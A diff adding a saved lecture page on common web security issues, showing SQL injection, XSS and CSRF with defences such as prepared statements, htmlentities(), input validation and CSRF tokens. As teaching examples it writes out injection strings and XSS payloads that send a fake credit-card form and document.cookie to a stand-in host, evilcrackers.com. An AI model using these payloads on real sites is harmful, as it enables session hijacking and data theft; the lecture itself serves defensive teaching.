@@ -1,0 +1,410 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0077)https://edward2.solent.ac.uk/course/resources.php?unit=dfti&file=lecture6.xml -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title></title>
+
+<link rel="stylesheet" type="text/css" href="./Security Issues_files/dfti0910.css">
+<style type="text/css">
+body { font-size: 80%}
+</style>
+</head><body>
+<div id="sidebar">
+<a class="sidebarentry" href="https://edward2.solent.ac.uk/course/index.php?unit=dfti">DFTI</a>
+<a class="sidebarentry" href="https://edward2.solent.ac.uk/course/wad/">WAD</a>
+<a class="sidebarentry" href="https://edward2.solent.ac.uk/course/mad/">MAD</a>
+<a class="sidebarentry" href="https://edward2.solent.ac.uk/course/ema/">EMA</a>
+</div>
+<div id="main">
+
+<div class="subtitle"><h1>Common Security Issues in Web Development</h1></div><hr><p>Page 1</p><h1>Common Security Issues in Web Development</h1>
+<ul>
+<li>SQL Injection</li>
+<li>MySQL Prepared Statements</li>
+<li>Cross-Site Scripting and how to prevent it</li>
+<li>Cross-Site Request Forgery</li>
+</ul>
+<hr><p>Page 2</p><h1>Firstly, why security?</h1>
+<ul>
+<li>Obviously to protect credit card details and passwords</li>
+<li>Preventing "spam" on mailing lists or forums</li>
+<li>Site vandalism: preventing deletion of legitimate content by unauthorised
+users</li>
+<li>Confidentiality: many personal details are covered by GDPR</li> 
+</ul>
+<hr><p>Page 3</p><h1>SQL Injection</h1>
+<ul>
+<li>A subtle but potentially dangerous security issue</li>
+<li>A cracker could potentially enter an SQL query in an HTML form and 
+grab confidential data, or even modify or delete a table!</li>
+<li>e.g.
+<pre>&lt;?php
+$n = $_GET['name'];
+... connect to database ...
+$results=$db-&gt;query("select * from details where name='$n'");
+?&gt;
+</pre>
+</li>
+<li>If the user entered in the form the following:
+<pre>Fred'; UPDATE users SET password='cracked' 
+WHERE username='admin</pre>
+the query generated would be:
+<pre>SELECT * FROM details WHERE NAME='<em>Fred'; 
+UPDATE users SET password='cracked' 
+WHERE username='admin</em>'</pre>
+with potentially devastating results!!!</li>
+</ul>
+<hr><p>Page 4</p><h1>Another example</h1>
+<ul>
+<li>Go to
+<a href="http://edward.solent.ac.uk/~nick/sqlinject.html">this 
+example on Edward</a>
+</li>
+<li>Login with:
+<pre>Username: amurphy' OR '1=1
+Password: blah
+</pre>
+</li>
+<li>The login script (a standard login script like you did last week) 
+will run this
+SQL query:
+<pre>SELECT * FROM users WHERE password='blah' AND username='<em>amurphy' OR '1=1</em>'
+</pre>
+</li>
+<li>This means: 
+<em>select all records from the users table where:
+    <ul>
+    <li>EITHER the password is 'blah' AND the username is 'amurphy'</li>
+    <li>OR 1=1 (which is always true)</li>
+    </ul>
+</em>
+</li>
+<li>The second condition (1=1) will always be true so
+it will return all records in the users table, including their credit card details!</li>
+</ul>
+<hr><p>Page 5</p><h1>MySQL Prepared Statements</h1>
+<ul>
+<li>We have seen already how to connect to databases from PHP</li>
+<li>However the basic approach described in week 4 is
+prone to SQL injection</li>
+<li>How can we prevent SQL injection occurring?
+    <ul>
+    <li>Previous approaches involved validating data (e.g. checking numeric input is indeed numeric)
+    or manually adding escape characters (e.g. \) in front of characters with special meaning to SQL</li>
+    <li>However such approaches do not prevent all SQL injection attacks</li>
+    </ul>
+</li>
+<li>Instead, it is recommended to use <em>prepared statements</em></li>
+</ul>
+<hr><p>Page 6</p><h1>Prepared statements - example</h1>
+<ul>
+<li>Example (INSERT statement, error-handling omitted for clarity):
+<pre>$conn=new PDO("mysql:host=localhost;dbname=database");
+$a = $_POST["username"];
+$b = $_POST["password"];
+$statement = $conn-&gt;prepare("INSERT INTO users(username,password) VALUES (?,?)");
+$statement-&gt;execute([$a, $b]);
+</pre>
+</li>
+</ul>
+<hr><p>Page 7</p><h1>How is the above example working?</h1>
+<ul>
+<li>We <em>prepare a statement</em> using <em>$conn-&gt;prepare</em>:
+<pre>$statement = $conn-&gt;prepare("INSERT INTO users(username,password) VALUES (?,?)");</pre>
+This loads an SQL statement into memory as a prepared statement, and returns a variable
+<em>$statement</em> which you can use to access the 
+compiled version of the prepared statement</li>
+<li>Note the two question marks <em>?</em>: these are placeholders which will be filled in with input data</li>
+<li>We then associate the placeholders with the input data
+with our <em>execute()</em> statement
+	<ul>
+	<li><em>execute()</em> takes an array of the values to be bound to the
+	placeholders</li>
+	</ul>
+</li>
+</ul>
+<hr><p>Page 8</p><h1>Prepared statements to retrieve information</h1>
+<ul>
+<li>We can also use prepared statements to retrieve information (i.e. SELECT statements)</li>
+<li>e.g.:
+<pre>$conn=new PDO("mysql:host=localhost;dbname=database");
+$a = $_GET["lastname"];
+$b = $_GET["course"];
+$statement = $conn-&gt;prepare("SELECT * FROM students WHERE lastname=? AND course=?");
+$statement-&gt;execute([$a, $b]);
+while($row=$statement-&gt;fetch())
+
+{
+    echo "$row[firstname] $row[lastname], Course $row[course], Phone $row[phone] &lt;br /&gt;";
+}
+</pre>
+</li>
+<li>After the statement has been executed, 
+<em>$statement</em> contains the result set from the database, similar
+to the <em>$results</em> variable we were using before
+(reference: <a href="http://uk3.php.net/manual/en/class.pdostatement.php">
+PHP documentation</a>)</li>
+<li>So we can use <em>fetch()</em> to fetch each row in turn from the
+result set, as before</li>
+</ul>
+<hr><p>Page 9</p><h1>Named placeholders in prepared statements</h1>
+<ul>
+<li>As well as using question marks to indicate placeholders to be filled in, we can use 
+<em>named placeholders</em></li>
+<li>For example:
+<pre>$conn=new PDO("mysql:host=localhost;dbname=database");
+$a = $_GET["lastname"];
+$b = $_GET["course"];
+$statement = $conn-&gt;prepare("SELECT * FROM students WHERE lastname=:thename AND course=:thecourse");
+$statement-&gt;execute([":thename"=&gt;$a, ":thecourse"=&gt;$b]);
+while($row=$statement-&gt;fetch())
+{
+    echo "$row[firstname] $row[lastname], Course $row[course], Phone $row[phone] &lt;br /&gt;";
+}
+</pre>
+</li>
+<li>Note how now, the placeholders are given names of <em>:thename</em> and <em>:thecourse</em></li>
+<li>...and <em>execute()</em> now takes an associative array of 
+placeholder names and bound values</li>
+</ul>
+<hr><p>Page 10</p><h1>Cross-site scripting (XSS)</h1>
+<ul>
+<li>A subtle, easily-overlooked, but widely-exploited, security risk with untested input to a web application</li>
+<li>Attackers link to your site from websites or emails advertising your site</li>
+<li>However, their links contain dangerous code embedded within a query string</li>
+<li>This code can include:
+    <ul>
+    <li>JavaScript code to perform a harmful action
+    such as steal your cookies
+    (including your session ID, with the result that someone could 
+    access your account)</li>
+	<li>Fake HTML hyperlinks or forms</li>
+    </ul>
+</li>
+<li>If your site displays the input (and many sites do),
+ your site will be fooled into running the injected code</li>
+<li>A very difficult problem to completely eliminate!</li>
+</ul>
+<hr><p>Page 11</p><h1>Basic, non-harmful XSS example</h1>
+<ul>
+<li>The usual way in which XSS attacks are done involve injecting harmful JavaScript</li>
+<li>This can be done by injecting &lt;script&gt; tags into the site</li>
+<li>Simple example (not harmful) of a link on a "special offers" site:
+<pre>&lt;a href="hittastic.com/buy.php?id=<em>465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</em>"&gt;Buy From Hittastic!&lt;/a&gt;</pre>
+</li>
+<li>If the buy.php script echoes out the input:
+<pre>$a = $_GET["id"];
+echo "You have selected the CD with ID $a";
+</pre>
+then the script would unwittingly echo out the &lt;script&gt; tag stored in $a, as it is part of the
+query string variable, i.e. it would echo out
+<pre>You have selected the CD with ID 465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</pre></li>
+<li>...and when the browser receives the &lt;script&gt; tag, it would run the JavaScript inside, because browsers
+process all tags returned from the server
+</li>
+<li>Result: user sees the message "666 I am the devil" as a popup in their browser</li>
+</ul>
+<hr><p>Page 12</p><h1>A more harmful XSS example</h1>
+<ul>
+<li>Example <a href="http://edward/dfti/examples/xss2/bogweed.php">here</a>
+    <ul>
+    <li>Bogweed Marketing are a "special-offers company" 
+    (?) who link to HitTastic! to allow users to "take advantage of
+    special offers"</li>
+    <li>However, the Bogweed links contain embedded 
+    dangerous code</li>
+    </ul>
+</li>
+<li>Example of injected code:
+<pre>&lt;a href='hittastic.com/buy.php?id=<em>465&lt;form action=http://evilcrackers.com/steal.php&gt;
+Enter credit card details &lt;input name=creditcard /&gt; &lt;/form&gt;</em> &gt;Buy Music From HitTastic!&lt;/a&gt;</pre>
+</li>
+<li>As in the previous example, the query string variable is echoed out, meaning that the HTML form embedded in it is sent back to the
+browser and processed by the browser...</li>
+<li>resulting in a fake form appearing within the legitimate HitTastic! site, fooling users into
+entering their credit card details!</li>
+</ul>
+<hr><p>Page 13</p><h1>XSS and Cookie Theft with Embedded JavaScript</h1>
+<ul>
+<li>An even more dangerous XSS attack would involve embedded JavaScript within
+the links, to steal user's cookies</li>
+<li>e.g. the link could read:
+<pre>buy.php?id=<em>123&lt;script&gt;window.location='http://evilcrackers.com/stealcookie.php?cookie='%2Bdocument.cookie&lt;/script&gt;</em></pre>
+</li>
+<li>Now the query string contains some embedded JavaScript to set the user's
+current web page (window.location) to <em>evilcrackers.com/stealcookie.php</em> and sends 
+user's cookies (accessible in JavaScript using <em>document.cookie</em>)
+to this URL
+<ul>
+<li>The %2B is an encoded version of a + sign (2B is the ASCII hex code for +); this is because when sending
+requests, + is used to represent spaces, so a literal + would be interpreted
+as a space and hence would not work in the attack as it would be converted to a space</li>
+</ul>
+</li>
+<li>The user will be taken to HitTastic!, but, as the ID is echoed out, the JavaScript will immediately
+run (as in the first example) and redirect the user to <em>evilcrackers.com</em></li>
+<li>The owners of <em>evilcrackers.com/stealcookie.php</em> 
+will then have the session ID and can impersonate the original user</li>
+<li>If <em>evilcrackers.com</em> are really nasty, they could then redirect
+the user straight back to HitTastic!, so the user will be unaware of the
+entire process</li>
+</ul>
+<hr><p>Page 14</p><h1>Hidden XSS attacks with URL encoding</h1>
+<ul>
+<li>Normally the XSS crackers go to greater lengths than the above, to hide
+their attack and make it non-obvious</li>
+<li>It's possible to encode the <em>entire</em> injected JavaScript as 
+<em>URL encoded</em> characters (e.g the letter 'a' would be encoded as %61, its ASCII
+code in hexadecimal, or the character '!' would be encoded as %21)</li>
+<li>When the user moves over the harmful link, the injected JavaScript would appear 
+as the URL-encoded version such as
+<pre>%3Cscript%3Ealert%28666%29%3C%2Fscript%3E</pre>
+</li>
+<li><em>However</em>, the server would decode the URLs (e.g. convert %61 back to 'a')
+and treat the injected code as the actual
+JavaScript:
+<pre>&lt;script&gt;alert(666)&lt;/script&gt;</pre>
+meaning the attack still takes place</li>
+</ul>
+<hr><p>Page 15</p><h1>Guarding against basic XSS attacks: encoding input with htmlentities()</h1>
+<ul>
+<li>In simple cases, an effective way to guard against XSS attacks is to <em>encode</em> the input</li>
+<li>As we have seen, XSS attacks rely on tags (e.g. script tags) being injected into a page which
+is then fooled into displaying them</li>
+<li>If we can encode the input so that the browser does not recognise it as tags, we can
+prevent this happening</li>
+<li>The <em>htmlentities()</em> function does this:
+<pre>$encoded = htmlentities($_GET["input"]);</pre>
+</li>
+</ul>
+<hr><p>Page 16</p><h1>How does htmlentities() work?</h1>
+<ul>
+<li>htmlentities() encodes characters with special meaning to html (e.g. &lt; and &gt; ) into
+<em>entities</em></li>
+<li>Entities are encoded versions of the characters which allow browsers to display the literal
+symbol (e.g. &lt; or &gt; ) rather than intepreting it as a character with special meaning</li>
+<li>They consist of an ampersand preceded by a code, e.g. &amp;lt; for &lt; and
+&amp;gt; for &gt;</li>
+<li>So, for example, &lt;script&gt; would become &amp;lt;script&amp;gt;</li>
+<li>The result would be that the browser would simply display the text
+&lt;script&gt; rather than interpreting it as a script tag</li>
+</ul>
+<hr><p>Page 17</p><h1>Input validation</h1>
+<ul>
+<li>It is tricky to encode JavaScript in the same way as HTML (no simple PHP function exists,
+though third-party libraries such as <a href="http://www.htmlpurifier.org/">HTMLPurifier</a> will do it), 
+so <em>validation of input data</em> is an alternative approach</li>
+<li>Data can be <em>validated</em> to check that it is in the correct format
+(e.g. numbers only, letters only, letters and numbers)</li>
+<li>Several functions available to do this, e.g.
+    <ul>
+    <li>The <em>character type functions</em> check that input contains 
+    various types of characters (e.g. letters only, letters and numbers only)
+    </li>
+    <li><em>Regular expressions</em> provide powerful and 
+    flexible validation of input</li>
+    </ul>
+</li>
+</ul>
+<hr><p>Page 18</p><h1>Character type functions</h1>
+<ul>
+<li>The character type functions check the type of data being input to the script</li>
+<li>Examples of character type functions:
+    <ul>
+    <li><em>ctype_alpha</em> - checks that the input contains letters only</li>
+    <li><em>ctype_digit</em> - checks that the input contains numbers only</li>
+    <li><em>ctype_alnum</em> - checks that the input contains 
+    letters and numbers only</li>
+    </ul>
+</li>
+<li>e.g:
+<pre>$a = $_GET["name"];
+
+// ! means NOT
+if(!ctype_alnum($a))
+{
+    echo "ERROR: Input contains characters other than letters and numbers.";
+}
+</pre>
+</li>
+<li>As well as XSS these can guard against SQL injection where the format
+of the input is known (e.g. a username containing only letters and numbers)
+</li>
+</ul>
+<hr><p>Page 19</p><h1>Cross-site Request Forgery (CSRF)</h1>
+<ul>
+<li>Another widely-encountered security breach is 
+<em>cross-site request forgery</em> (CSRF)</li>
+<li>CSRF occurs when an attacker attempts to send an unauthorised 
+HTTP request to a sensitive URL on a site the user is currently logged
+into without the consent of the user
+	<ul>
+	<li>e.g. a URL which buys a product from an online store and results
+	in the user losing money</li>
+	</ul>
+</li>
+</ul>
+<hr><p>Page 20</p><h1>CSRF - how is it likely to happen?</h1>
+<ul>
+<li>Often through malicious images on malicious websites or on forums
+with inadequate security protection, which allow users to post
+images without validation</li>
+<li>The <em>src</em> tag of an image can point to something which is
+<em>not</em> an image, but the request to the specified URL will still
+be made</li>
+<li>e.g. this &lt;img&gt; tag will make a request to <em>download.php</em>
+even though <em>download.php</em> is not an image:
+<pre>&lt;img src="http://ephp.solent.ac.uk/~ephp001/download.php?id=1" /&gt;</pre>
+If <em>download.php</em> is a page on HitTastic! which
+downloads a given song, and the user is currently logged onto HitTastic!, then
+the user will lose money</li>
+<li>More seriously, the same technique could be used to transfer funds from
+the user to the fraudster who created the CSRF attack</li>
+<li>See:
+	<ul>
+	<li><a href="https://edward2.solent.ac.uk/dfti/csrf.html">Ben Jones' Nature Rambles</a>: 
+	A CSRF demo site.
+	Ben Jones is not a nature rambler at all.  He is a dangerous 
+	cracker who loves stealing money from people's accounts.</li>
+	<li>To use: login to <a href="http://ephp.solent.ac.uk/~ephp001">
+	HitTastic!</a> (TimWilson/egg882), and, on another tab, visit Ben Jones' 
+	Nature Rambles. What happens to your balance?</li>
+	<li>Select "View Source" on "Ben Jones' Nature Rambles" for full
+	explanation</li>
+	</ul>
+</li>
+<li>As well as images, malicious scripts could be used to execute an
+unauthorised action</li>
+</ul>
+<hr><p>Page 21</p><h1>Guarding against CSRF - Tokens</h1>
+<ul>
+<li>A <em>CSRF Token</em> is the recommended way to guard against CSRF
+(see for instance <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet">OWASP</a>, who are regarded as a leading authority on web security)</li>
+<li>A CSRF token is a random string which is generated once per user
+session (i.e. when a user logs in), and stored in a session variable</li>
+<li>When a form which carries out a sensitive operation 
+(e.g. download, order, transfer funds) is generated from PHP, the CSRF token 
+needs to be <em>sent with the associated HTTP request</em> (e.g. embedded
+in the form as a hidden field)</li>
+<li>The script that carries out the sensitive operation should check the
+value sent within the form against the value stored in the session variable
+</li>
+<li>If they do not match, or there is no CSRF token in the form, then the
+operation should not be carried out</li>
+<li>Attackers will not know the CSRF token, so the attempted forged 
+request will fail</li>
+<li>Generating a random token in PHP:
+<pre>$token = bin2hex(random_bytes(32));</pre>
+This will generate 32 random bytes and then convert them into a string of
+hex codes with the <em>bin2hex()</em> function</li>
+<li>For additional security, generate a new token per request, rather than
+per session (less chance to steal the token)</li>
+</ul>
+<hr><div id="nav">
+		<a href="https://edward2.solent.ac.uk/course/index.php">
+		<img src="./Security Issues_files/home.png" alt="Home">
+		</a>
+		</div>
+		<em>Font size:</em> <a href="https://edward2.solent.ac.uk/course/resources.php?file=lecture6.xml&amp;unit=dfti&amp;fs=60">Small</a> <a href="https://edward2.solent.ac.uk/course/resources.php?file=lecture6.xml&amp;unit=dfti&amp;fs=80">Normal</a> <a href="https://edward2.solent.ac.uk/course/resources.php?file=lecture6.xml&amp;unit=dfti&amp;fs=100">Large</a> <a href="https://edward2.solent.ac.uk/course/resources.php?file=lecture6.xml&amp;unit=dfti&amp;fs=120">V.large</a> <p></p>
+
+
+</div></body></html>
